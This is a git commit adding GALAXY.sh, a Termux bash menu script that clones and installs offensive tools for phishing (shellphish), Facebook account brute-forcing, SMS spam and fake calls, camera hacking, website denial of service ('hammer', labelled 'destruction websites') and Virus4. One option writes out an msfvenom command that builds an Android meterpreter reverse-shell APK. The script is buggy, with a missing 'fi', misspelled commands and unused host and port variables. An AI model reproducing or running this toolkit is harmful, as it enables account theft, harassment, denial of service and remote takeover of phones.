3cf388058969efb7c0f3a932a47f834fe7536e13
ghoussam <49067659+ghoussam@users.noreply.github.com>
2019-04-02 13:13:55 +0100

    GALAX.sh
    pkg install git && git clone https://github.com/ghoussam/GALAXY-SH
    the tooll by saoula Houssam eddine

---
+++ GALAXY.sh
@@ -0,0 +1,348 @@
+#!/bin/bash
+red='\e[1;31m'
+green='\e[1;32m'
+blue='\e[1;34m'
+purple='\e[1;35m'
+cyan='\e[1;36m'
+white='\e[1;37m'
+yellow='\e[1;33m' 
+				                 																												
+ echo -e $green "Tools py Termux"				
+ toilet "GALAXY DZ"
+ echo -e "hello to my tool HOUSSAM DZ"
+ echo -e $purple
+ toilet "GALAXY SH"
+ toilet "GALAXY DZ"
+ echo -e $cyan "Tool py saoula houssam eddine 
+				my facebook saoula Houssam 
+                    					 eddine
+ <<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<>>>>>>>><<<<<>>>>>                 
+                    welcome to my big tool		     
+<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>><<<<<<<<<<<<>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<>><<>
+        			 Options Select one
+			<<<<<<=====><<<<<<<<<<<<<<<=>
+	                    33===>tool termux
+			<<<<<>>>>>><<<===============
+                            777===}show all the tools
+ 	        	=============================
+                            00===>info about me
+                        ==================<==<<<<<<<<<
+                            44=>info about my toot   
+	                >==============<<<<============
+			       	    
+         $purple               117==>exit"
+  echo -e $blue		
+											
+  read -p "chose a num===>~ " u 
+
+								      	          	          
+if [ $u -eq 33 ]; then
+toilet "Tools termux"
+echo -e $cyan "The most used tools
+          ========================
+               55===>metasploit
+	  =====================
+               22===>facebook
+	  ================<=======
+               56===>camera                 
+         ==========================
+               34===>haking website		
+        >>>>>><<><><><<><<<<<<<><<<>>> 
+               100==>destruction websites
+        <>=======><><<>><<<>============>
+               57===>root in termux
+         >><><><===================<<<<>			
+               1000===>Download programming languages in termux
+         ==========<<======<<<<==<<=><=><=<<<<<<<<<<<<<<<<<<<<<<<<<
+               45===>Sending messages and annoying calls
+	 ===<<<=<>><<><<<<<<<<<<<<<<============<><><><>
+	       77===>the must tool use in termux
+  	 ===============<>>><><==<>>>>>>>>>>>>>>><
+$green         66===>back
+               117===>exit"
+	      					
+read -p "entrer the num====> " u
+fi
+if [ $u -eq 55 ]; then
+toilet "haking"
+echo -e $cyan  "1==>install nmap
+                2---->show your ip 
+               16---->install metasploit framwork
+               7---->pyloads with apk			
+               25--->create pyloads for android
+               117==>exit                        
+               66===>back"     	   
+                                    	       											      			   
+read -p "chose a num===> " u 
+fi	         
+if [ $u -eq 22 ]; then
+toilet "facebook" 
+echo -e $purple "4---->install shellphish
+    	         8---->install guardn
+		 14---->Haking facebook
+		 15---->make list password with cupp
+		 24---->Extraction facebook
+		 22---->fb2
+		 20----->mbf facebook
+                 21----->Retrieve emails from your friends
+       $green
+		     117==>exit
+		66==>back"
+				
+read -p "chose a num===>~ " u
+fi				
+if [ $u -eq 56 ]; then
+toilet "hack" 
+echo -e "23----> haking camera
+	         117==>exit
+                     	       66==>back"
+
+read -p "chose a num===>~ " u
+fi
+if [ $u -eq 34 ]; then
+echo -e $green "12---->sqlmap
+                117<>===>exit		back==>66"
+              
+read -p "chose a num===>~ " u
+fi
+if [ $u -eq 100 ]; then
+toilet "death"
+echo -e "19----->hammer
+	$blue 117==>exit
+	 66==>back"
+
+read -p "chose a num===>~ " u
+fi
+if [ $u -eq 57 ]; then
+toilet "root"
+echo -e $red "13====>root in termux
+	       66==>back
+	       117==>exit"
+        $cyan
+						
+read -p "chose a num===>~ " u	
+fi				
+if [ $u -eq 1000 ]; then
+toilet "hy admin"
+echo -e $blue "18----=>Install programs termux all
+	        66==>back
+		117===>exit"
+
+read -p "chose a num====> " u
+fi		
+if [ $u -eq 45 ]; then
+toilet "SMS"
+echo -e $red "10---->send sms
+               11---->fakecall
+	$green   117==>exit
+	       66==>back"
+							
+read -p "chose a num==> " u
+fi
+if [ $u -eq 77 ]; then
+toilet "the tool"
+echo -e $cyan "3---->install Lazymux
+               5---->install Virus4
+               6---->install DarkFly-Tool
+               7---->install TOOL-DZ      
+               9---->install Tool-X  
+               117==>exit
+                66==>back"	
+                                     	 
+read -p "chose a num==> " u
+fi
+if [ $u -eq 777 ]; then	          							
+echo -e $red "THE TOOL BY TERMUX  GALAXY BY SAOULA HOUSSAM 
+EDDINE	       				 
+	      	      						
+               -1==>install nmap
+               2---->show your ip
+               3---->install Lazymux
+               4---->install shellphish
+               5---->install Virus4      
+               6---->install DarkFly-Tool                 
+               7---->install TOOL-DZ       
+               8---->install guardn  
+               9---->install Tool-X 
+               10---->send sms		
+               11---->fakecall 
+               12---->sqlmap	
+  	       13---->root in termux
+               14---->Haking facebook	
+               15---->make list password with cupp
+               16---->install metasploit framwork	
+               17---->pyloads with apk
+               18----=>Install programs termux all
+               19----->hammer				
+	       20----->mbf facebook
+               21----->Retrieve emails from your friends
+   	       22---->fb2
+               23----> haking camera
+               24---->Extraction facebook
+               25--->create pyloads for android
+        $cyan                                         
+                 66 ==>back   				            					
+           
+                                                                                
+           117===>exit"		     		  	                 
+
+read -p "enter the num=====>  " u				 			  	               				 																                   	       	 
+fi
+if [ $u -eq 1 ]; then
+toilet "nmap" && pkg install nmap && clear
+fi
+if [ $u -eq 2 ]; then
+toilet "inet adress 2" && ifconfig
+fi
+if [ $u -eq 3 ]; then
+toilet "Lazymux"&& pkg install git&& 
+git clone https://github.com/Gameye98/Lazymux 
+fi				
+if [ $u -eq 4 ]; then						
+toilet "shellphish" && pkg install git &&               
+git clone https://github.com/thelinuxchoice/shellphish
+fi
+if [ $u -eq 5 ]; then
+toilet "Virus4" && pkg install git&& git clone https://github.com/Amerlaceset/Amer && cd $HOME && bash GALAXY.sh
+if [ $u -eq 6 ]; then
+toilet "DarkFly-Tool" && pkg install git && git clone https://github.com/Ranginang67/DarkFly-Tool
+fi      	        
+if [ $u -eq 7 ]; then				
+toilet "TOOL-DZ" && pkg install git &&       
+git clone https://github.com/0uss4ma/TOOL-DZ
+fi
+if [ $u -eq 8 ]; then
+toilet "facebook" && pkg install git && 
+git clone https://github.com/Noxturnix/guardn 
+fi						
+if [ $u -eq 9 ]; then
+toilet "Tool-X" && pkg install git &&
+git clone https://github.com/Rajkumrdusad/Tool-X
+fi
+if [ $u -eq 10 ]; then
+toilet "Spammer-Grab" && pkg install git && 
+git clone https://github.com/p4kl0nc4t/Spammer-Grab
+fi
+if [ $u -eq 11 ]; then
+toilet "fakecall" && pkg install git && pkg install git &&
+git clone https://github.com/siputra12/fakecall
+fi
+if [ $u -eq 12 ]; then
+toilet "sqlmap" && pkg install git && git clone https://github.com/sqlmapproject/sqlmap.git
+fi
+if [ $u -eq 13 ]; then
+toilet "root" && pkg install fakeroot
+fi
+if [ $u -eq 14 ]; then			     
+toilet "facebook" && pkg install git &&       				
+git clone https://github.com/IAmBlackHacker/Facebook-BruteForce 
+fi						
+if [ $u -eq 15 ]; then
+toilet "cupp" && pkg install git && 
+git clone https://github.com/Mebus/cupp.git
+fi
+if [ $u -eq 16 ]; then
+toilet "metasploit" && pkg upgrade && pkg install unstable-repo &&
+pkg install metasploit
+fi
+if [ $u -eq 17 ]; then
+toilet "Tmux-Bunch" && pkg upgarde && pkg install git && 
+git clone https://github.com/Hax4us/Tmux-Bunch.git
+fi
+if [ $u -eq 117 ]; then
+toilet "bye bye good lucky" && exit
+fi            
+if [ $u -eq 18 ]; then
+toilet "Install programs" && apt update && apt update &&
+apt upgrade &&
+ apt-get update &&
+apt-get upgrade &&
+apt install php &&
+apt install python &&
+apt install python2 &&
+apt install git &&
+apt install golang &&
+ apt install host &&
+apt install nano &&
+ apt install havij &&
+apt install hydra &&
+apt install wireshark &&
+apt install cmatrix &&
+ pkg install figlet &&
+pkg install wget && pkg install wget -y &&
+pkg install python2 -y &&
+ pkg install python2-dev -y &&
+ apt install wireshark &&
+pkg install cowsay &&
+pkg install toilet &&
+pkg install ruby &&
+pkg install help &&
+gem install lolcat &&
+pkg install curl &&
+ pkg install wgetrc &&
+ pkg install unzip &&
+pkg install openssh &&
+pkg install tor &&
+pkg install tar &&
+pkg install zip &&
+ pkg install net-tools &&
+pkg install unrar &&
+ pkg install clang &&
+pkg install w3m &&
+pkg install proot &&
+ pip2 install wget &&
+pip2 install requests && clear
+fi
+if [ $u -eq 19 ]; then
+toilet "Destruction of sites" && pkg install git && 
+git clone https://github.com/cyweb/hammer && cd $HOME && bash GALAXY.sh
+fi						
+if [ $u -eq 20 ]; then
+toilet "MBF" && pkg install git && 
+git clone https://github.com/YukersCreew/mbf
+fi
+if [ $u -eq 21 ]; then
+toilet "OSIF" && pkg install git && 
+git clone https://github.com/CiKu370/OSIF
+fi
+if [ $u -eq 22 ]; then 
+toilet "fb2" && pkg instsll git &&
+git clone https://github.com/Fakher01hacker/fb2
+fi
+if [ $u -eq 23 ]; then
+toilet "ipcs" && pkg install git && 
+git clone https://github.com/kancotdiq/ipcs
+fi
+if [ $u -eq 24 ]; then
+toilet "ghost" && pkg install git &&
+git clone https://github.com/islam928/Ghost
+fi
+if [ $u -eq 25 ]; then
+toilet "pyload"
+  read -p "host===> " u &&
+  read -p "port==> " u &&
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > /sdcard/hoi.apk 
+fi      				
+if [ $u -eq 00 ]; then
+toilet "hy" 
+echo -e $cyan "Programmer:saoula Houssam eddine 
+Assistants in programming:yahia et Ayoub et 
+Ala      						
+         66==>back
+         117==>exit"			
+read -p "chose num ===> " u
+fi
+if [ $u -eq 44 ]; then
+toilet "saoula"
+echo -e $purple "This tool is specialized in collecting information and tools which are 
+very fascinating of programming saoula Houssam eddine 
+	
+         66==>back
+        117==}exit" 
+				
+read -p "chose a num===>~ " u
+fi	 
+if [ $u -eq 66 ]; then
+toilet "hhhh"
+cd $HOME && cd GALAXY && bash GALAXY.sh
+fi
